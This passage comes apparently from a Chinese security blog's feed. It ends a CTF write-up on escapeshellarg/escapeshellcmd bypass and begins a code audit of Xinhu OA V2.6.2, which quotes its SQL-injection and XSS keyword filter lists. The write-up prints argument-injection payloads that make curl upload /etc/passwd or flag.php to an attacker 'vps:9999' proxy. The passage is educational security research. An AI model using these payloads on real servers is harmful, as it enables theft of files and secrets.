<code>&#39;</code> 和 <code>&quot;</code>仅在不配对儿的时候被转义。</li></ul><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-20.png"></p><p>在字符串增加了引号同时会进行转义，那么之前的payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/index1.php?url=http://127.0.0.1 -T /etc/passwd</span><br></pre></td></tr></table></figure><p>因为增加了 <strong>‘</strong> 进行了转义，所以整个字符串会被当成参数。注意 <strong>escapeshellcmd</strong> 的问题是在于如果 <strong>‘</strong> 和 <strong>“</strong> 仅在不配对儿的时候被转义。那么如果我们多增加一个 <strong>‘</strong> 就可以扰乱之前的转义了。如下：<br><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-21.png"></p><p>在 <strong>curl</strong> 中存在 <strong>-F</strong> 提交表单的方法，也可以提交文件。 <strong>-F &lt;key&#x3D;value&gt;</strong> 向服务器POST表单，例如： <strong>curl -F “web&#x3D;@index.html;type&#x3D;text&#x2F;html” url.com</strong> 。提交文件之后，利用代理的方式进行监听，这样就可以截获到文件了,同时还不受最后的的影响。那么最后的payload为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://baidu.com/&#x27; -F file=@/etc/passwd -x  vps:9999</span><br></pre></td></tr></table></figure><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-22.png"></p><p>这里应该是和 <strong>curl</strong> 版本有关系，我在 **7.54.0 ** 下没有测试成功。<br><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-23.png"></p><p>题目中的 <strong>curl</strong> 版本是 <strong>7.19.7</strong><br><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-24.png"></p><p>根据猜测，可能在是新版本中，先会执行 <strong>curl http</strong> 的操作，但是由于在后面增加了,例如 <strong><a href="http://127.0.0.1,/">http://127.0.0.1，</a></strong> 但是curl无法找到这样的文件，出现404。出现404之后，后面的提交文件的操作就不进行了，程序就退出了。这样在vps上面就无法接受到文件了。</p><h3 id="解题payload："><a href="#解题payload：" class="headerlink" title="解题payload："></a>解题payload：</h3><p>所以这题最后的 <strong>payload</strong> 是这样的。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php?flag=QNKCDZO&amp;hongri=s878926199a&amp;url=http://baidu.com/&#x27;</span> -<span class="keyword">F</span> <span class="string">file=@/var/www/html/flag.php</span> -x <span class="string"></span> vps:9999 <span class="string">HTTP/1.1</span></span><br><span class="line"><span class="string">Host:</span> 127.0.0.1</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=om11lglr53tm1htliteav4uhk4</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>112</span><br><span class="line"></span><br><span class="line"><span class="language-sqf"><span class="variable">_GET</span>[<span class="built_in">flag</span>]=QNKCDZO&amp;<span class="variable">_GET</span>[hongri]=s878926199a&amp;<span class="variable">_GET</span>[url]=http:<span class="comment">//baidu.com/&#x27; -F file=@/var/www/html/flag.php -x  vps:9999</span></span></span><br></pre></td></tr></table></figure><p><a href="https://lorexxar.cn/2016/12/28/cve-2016-10030/">phpmailer RCE漏洞分析</a><br><a href="https://paper.seebug.org/164/">PHP escapeshellarg()+escapeshellcmd() 之殇</a><br><a href="https://blog.chaitin.cn/phpmailer-cve-2016-10033/">PHPMailer 命令执行漏洞（CVE-2016-10033）分析</a></p>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【代码审计】信呼OA V2.6.2 代码审计</title>
      <link href="/2024/10/03/WebSecurity/codeaudit/xinhuoaaudit/"/>
      <url>/2024/10/03/WebSecurity/codeaudit/xinhuoaaudit/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.freebuf.com/articles/web/286380.html">https://www.freebuf.com/articles/web/286380.html</a></p><h2 id="信呼OA-审计"><a href="#信呼OA-审计" class="headerlink" title="信呼OA 审计"></a>信呼OA 审计</h2><p>admin qwer1234<br>信呼OA是一款自主MVC的办公系统，官网：<a href="http://www.rockoa.com/">http://www.rockoa.com/</a></p><h2 id="入口分析"><a href="#入口分析" class="headerlink" title="入口分析"></a>入口分析</h2><p>index.php 中 <code>include_once(&#39;config/config.php&#39;);</code> 跟进到 <code>config/config.php</code>查看<br><img src="/2024/10/03/WebSecurity/codeaudit/xinhuoaaudit/image.png"><br><code>@session_start();</code> 这行代码在 PHP 中用来启动一个新的会话或者继续当前会话。这里解释一下各个组成部分的含义和作用：</p><ol><li><p><strong><code>session_start()</code> 函数</strong>：</p><ul><li>这个函数用来创建一个会话或者恢复基于会话标识符传递的当前已存在的会话。该函数使得 PHP 脚本能够使用 <code>$_SESSION</code> 超全局数组存储和访问会话数据。通过会话，服务器能够存储关于用户的状态信息（如用户身份验证状态、购物车内容等）。</li><li>会话数据在服务器端保存，通常在服务器的临时目录下，而不是用户的计算机上，从而增加了数据的安全性。客户端浏览器会保存一个会话 ID 的 cookie，该 ID 用来在多个页面请求之间识别用户。</li></ul></li><li><p><strong><code>@</code> 错误控制运算符</strong>：</p><ul><li>在 PHP 中，<code>@</code> 符号是一个错误控制运算符，用于抑制表达式可能产生的错误消息。当在表达式前加上 <code>@</code> 时，任何由该表达式产生的错误都不会显示出来，这使得代码在遇到非致命错误时可以继续执行。</li><li>使用这个运算符可以防止用户看到一些可能由会话启动问题（例如，当会话已经在另一个脚本中启动时）引起的警告信息。</li></ul></li><li><p><strong><code>if(function_exists(&#39;date_default_timezone_set&#39;))date_default_timezone_set(&#39;Asia/Shanghai&#39;);</code></strong></p><ul><li>这里检查 <code>date_default_timezone_set</code> 函数是否存在（主要是为了向后兼容老版本的PHP）。如果存在，就将默认时区设置为<code>&#39;Asia/Shanghai&#39;</code>。确保了所有基于时间的函数都将使用这个时区。</li></ul></li><li><p><strong><code>header(&#39;Content-Type:text/html;charset=utf-8&#39;);</code></strong></p><ul><li>这行代码设置HTTP响应的Content-Type头为<code>text/html</code>，并指定字符集为<code>UTF-8</code>。这告诉浏览器返回的内容是HTML文本，并且使用UTF-8编码，有助于正确显示包括中文在内的各种字符。</li></ul></li><li><p><strong><code>define(&#39;ROOT_PATH&#39;,str_replace(&#39;\\&#39;,&#39;/&#39;,dirname(dirname(__FILE__))));</code></strong></p><ul><li>这行代码定义了一个常量<code>ROOT_PATH</code>，用于存储系统的根目录路径。它使用<code>dirname(dirname(__FILE__))</code>来找到当前文件的上级目录的上级目录（即根目录），并将所有的反斜杠(‘\‘)替换为正斜杠(‘&#x2F;‘)，以保证路径在不同操作系统下都是有效的。</li></ul></li></ol><p>之后分析包含的其中包含的文件<code>rockFun.php, Chajian.php</code>，其中都没什么内容，rockclass.php深入分析</p><h2 id="Rockclass"><a href="#Rockclass" class="headerlink" title="Rockclass"></a>Rockclass</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;ip= <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getclientip</span>();  <span class="comment">// 获取客户端 IP 地址</span></span><br><span class="line"><span class="variable language_">$this</span>-&gt;host= <span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>])? <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>]: <span class="string">&#x27;&#x27;</span> ;  <span class="comment">// 获取和处理 HTTP 主机名</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;host &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;host,-<span class="number">3</span>)==<span class="string">&#x27;:80&#x27;</span>)<span class="variable language_">$this</span>-&gt;host = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;:80&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$this</span>-&gt;host);   <span class="comment">// 如果主机名以端口号 80 结束，则从主机名中移除端口号。</span></span><br><span class="line"><span class="variable language_">$this</span>-&gt;url= <span class="string">&#x27;&#x27;</span>;  <span class="comment">// 当前 URL</span></span><br><span class="line"><span class="variable language_">$this</span>-&gt;isqywx= <span class="literal">false</span>;  <span class="comment">// 是否企业微信</span></span><br><span class="line"><span class="variable language_">$this</span>-&gt;win= <span class="title function_ invoke__">php_uname</span>();  <span class="comment">// 当前操作系统</span></span><br><span class="line"><span class="variable language_">$this</span>-&gt;HTTPweb= <span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>])? <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>]: <span class="string">&#x27;&#x27;</span> ;  <span class="comment">// 获取客户端浏览器信息</span></span><br><span class="line"><span class="variable language_">$this</span>-&gt;web= <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getbrowser</span>();  <span class="comment">// 获取客户端浏览器信息</span></span><br><span class="line"><span class="variable language_">$this</span>-&gt;unarr= <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>,<span class="string">&#x27;1,2&#x27;</span>);  <span class="comment">// 允许上传文件类型</span></span><br><span class="line"><span class="variable language_">$this</span>-&gt;now= <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">now</span>();  <span class="comment">// 当前时间</span></span><br><span class="line"><span class="variable language_">$this</span>-&gt;date= <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d&#x27;</span>);  <span class="comment">// 当前日期</span></span><br><span class="line"><span class="variable language_">$this</span>-&gt;lvlaras  = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>,<span class="string">&#x27;select ,</span></span><br><span class="line"><span class="string">alter table,delete ,drop ,update ,insert into,load_file,/*,*/,union,&lt;script,&lt;/script,sleep(,outfile,eval(,user(,phpinfo(),select*,union%20,sleep%20,select%20,delete%20,drop%20,and%20&#x27;</span>);  <span class="comment">// SQL 注入关键字</span></span><br><span class="line"><span class="variable language_">$this</span>-&gt;lvlaraa  = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>,<span class="string">&#x27;select,alter,delete,drop,update,/*,*/,insert,from,time_so_sec,convert,from_unixtime,unix_timestamp,curtime,time_format,union,concat,information_schema,group_concat,length,load_file,outfile,database,system_user,current_user,user(),found_rows,declare,master,exec,(),select*from,select*&#x27;</span>);  <span class="comment">// SQL 注入关键字</span></span><br><span class="line"><span class="variable language_">$this</span>-&gt;lvlarab= <span class="keyword">array</span>();  </span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable language_">$this</span>-&gt;lvlaraa <span class="keyword">as</span> <span class="variable">$_i</span>)<span class="variable language_">$this</span>-&gt;lvlarab[]=<span class="string">&#x27;&#x27;</span>;   <span class="comment">// 创建一个与 $this-&gt;lvlaraa 数组相同大小的空数组，用于存储过滤后的 SQL 注入关键字。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>XSS过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">xssrepstr</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$xpd</span>  = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>,<span class="string">&#x27;(,), ,,&lt;,&gt;,\\,*,&amp;,%,$,^,[,],&#123;,&#125;,!,@,#,&quot;,+,?,;\&#x27;&#x27;</span>);</span><br><span class="line"><span class="variable">$xpd</span>[]= <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$xpd</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取客户端IP地址</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">*获取IP</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getclientip</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$ip</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>];</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ip</span>= <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">xssrepstr</span>(<span class="variable">$ip</span>));</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span>)&#123;<span class="variable">$ipar</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$ip</span>);<span class="keyword">foreach</span>(<span class="variable">$ipar</span> <span class="keyword">as</span> <span class="variable">$ip1</span>)<span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$ip1</span>))<span class="variable">$ip</span>=<span class="string">&#x27;&#x27;</span>;&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$ip</span>)<span class="variable">$ip</span> = <span class="string">&#x27;unknow&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$ip</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>iconvsql</code> 方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">iconvsql</span>(<span class="params"><span class="variable">$str</span>,<span class="variable">$lx</span>=<span class="number">0</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$this</span>-&gt;lvlaraa,<span class="variable">$this</span>-&gt;lvlarab,<span class="variable">$str</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\n&quot;</span>,<span class="string">&#x27;&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$lx</span>==<span class="number">1</span>) <span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>),<span class="keyword">array</span>(<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>),<span class="variable">$str</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>功能与作用：</strong></p><ul><li>这个方法用于处理和清理 SQL 语句，以防止 SQL 注入攻击。</li><li><code>str_ireplace($this-&gt;lvlaraa, $this-&gt;lvlarab, $str)</code> 替换掉字符串 <code>$str</code> 中所有在 <code>$this-&gt;lvlaraa</code> 数组中定义的SQL关键词为 <code>$this-&gt;lvlarab</code> 数组中相应的空字符串，这种方法用于尝试清除可能导致SQL注入的语句。</li><li><code>str_replace(&quot;\n&quot;, &#39;&#39;, $str)</code> 移除字符串中的所有换行符。</li><li>如果参数 <code>$lx</code> 等于 <code>1</code>，则进一步移除字符串中的所有空格和制表符。这可能用于进一步减少 SQL 语句中不必要的空白，以减小其在数据库查询中的潜在危险。</li></ul><p><code>unstr</code> 方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">unstr</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$ystr</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="title function_ invoke__">count</span>(<span class="variable">$this</span>-&gt;unarr); <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">contain</span>(<span class="variable">$str</span>, <span class="variable">$this</span>-&gt;unarr[<span class="variable">$i</span>]))&#123;</span><br><span class="line">            <span class="variable">$ystr</span> = <span class="variable language_">$this</span>-&gt;unarr[<span class="variable">$i</span>];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$ystr</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>功能与作用：</strong></p><ul><li>这个私有方法用于检查字符串 <code>$str</code> 是否包含在类变量 <code>$this-&gt;unarr</code> 定义的特定值中。</li><li>通过遍历 <code>$this-&gt;unarr</code> 数组，并使用 <code>contain</code> 方法检查 <code>$str</code> 是否包含数组中的任何一个元素。如果是，就将该元素赋值给 <code>$ystr</code> 并终止循环。</li><li>返回的 <code>$ystr</code> 会是 <code>$str</code> 中第一个在 <code>$this-&gt;unarr</code> 数组中找到匹配的字符串，如果没有找到，则返回空字符串。</li></ul><h2 id="回到index"><a href="#回到index" class="headerlink" title="回到index"></a>回到index</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include_once</span>(<span class="string">&#x27;config/config.php&#x27;</span>);</span><br><span class="line"><span class="variable">$_uurl</span> = <span class="variable">$rock</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;rewriteurl&#x27;</span>);</span><br><span class="line"><span class="variable">$d</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$m</span> = <span class="string">&#x27;index&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;default&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_uurl</span> != <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>]);<span class="keyword">unset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;d&#x27;</span>]);<span class="keyword">unset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="variable">$m</span>= <span class="variable">$_uurl</span>;</span><br><span class="line"><span class="variable">$_uurla</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;_&#x27;</span>, <span class="variable">$_uurl</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_uurla</span>[<span class="number">1</span>]))&#123;<span class="variable">$d</span> = <span class="variable">$_uurla</span>[<span class="number">0</span>];<span class="variable">$m</span> = <span class="variable">$_uurla</span>[<span class="number">1</span>];&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_uurla</span>[<span class="number">2</span>]))&#123;<span class="variable">$d</span> = <span class="variable">$_uurla</span>[<span class="number">0</span>];<span class="variable">$m</span> = <span class="variable">$_uurla</span>[<span class="number">1</span>];<span class="variable">$a</span> = <span class="variable">$_uurla</span>[<span class="number">2</span>];&#125;</span><br><span class="line"><span class="variable">$_uurla</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;?&#x27;</span>,<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_uurla</span>[<span class="number">1</span>]))&#123;</span><br><span class="line"><span class="variable">$_uurla</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;&amp;&#x27;</span>, <span class="variable">$_uurla</span>[<span class="number">1</span>]);<span class="keyword">foreach</span>(<span class="variable">$_uurla</span> <span class="keyword">as</span> <span class="variable">$_uurlas</span>)&#123;</span><br><span class="line"><span class="variable">$_uurlasa</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;=&#x27;</span>, <span class="variable">$_uurlas</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_uurlasa</span>[<span class="number">1</span>]))<span class="variable">$_GET</span>[<span class="variable">$_uurlasa</span>[<span class="number">0</span>]]=<span class="variable">$_uurlasa</span>[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$m</span>= <span class="variable">$rock</span>-&gt;jm-&gt;<span class="title function_ invoke__">gettoken</span>(<span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;index&#x27;</span>);</span><br><span class="line"><span class="variable">$d</span>= <span class="variable">$rock</span>-&gt;jm-&gt;<span class="title function_ invoke__">gettoken</span>(<span class="string">&#x27;d&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>= <span class="variable">$rock</span>-&gt;jm-&gt;<span class="title function_ invoke__">gettoken</span>(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;default&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ajaxbool</span>= <span class="variable">$rock</span>-&gt;jm-&gt;<span class="title function_ invoke__">gettoken</span>(<span class="string">&#x27;ajaxbool&#x27;</span>, <span class="string">&#x27;false&#x27;</span>);</span><br><span class="line"><span class="variable">$mode</span>= <span class="variable">$rock</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;m&#x27;</span>, <span class="variable">$m</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$config</span>[<span class="string">&#x27;install&#x27;</span>] &amp;&amp; <span class="variable">$mode</span> != <span class="string">&#x27;install&#x27;</span>)<span class="variable">$rock</span>-&gt;<span class="title function_ invoke__">location</span>(<span class="string">&#x27;?m=install&#x27;</span>);</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&#x27;include/View.php&#x27;</span>);</span><br></pre></td></tr></table></figure><p>这段代码主要涉及动态 URL 处理和页面导航逻辑的处理，包括模块（m）、动作（a）和数据（d）的参数提取。这样的逻辑通常出现在 MVC 框架或类似的动态 Web 应用中，用于决定哪个控制器和方法应该被调用<br><img src="/2024/10/03/WebSecurity/codeaudit/xinhuoaaudit/image-1.png"><br>结合访问请求，可以看到这些参数对应着MVC框架中的内容<br>最后一行<code>include_once(&#39;include/View.php&#39;);</code><br>转而看下view.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$ajaxbool</span>))<span class="variable">$ajaxbool</span> = <span class="variable">$rock</span>-&gt;jm-&gt;<span class="title function_ invoke__">gettoken</span>(<span class="string">&#x27;ajaxbool&#x27;</span>, <span class="string">&#x27;false&#x27;</span>);</span><br><span class="line"><span class="variable">$ajaxbool</span>= <span class="variable">$rock</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;ajaxbool&#x27;</span>, <span 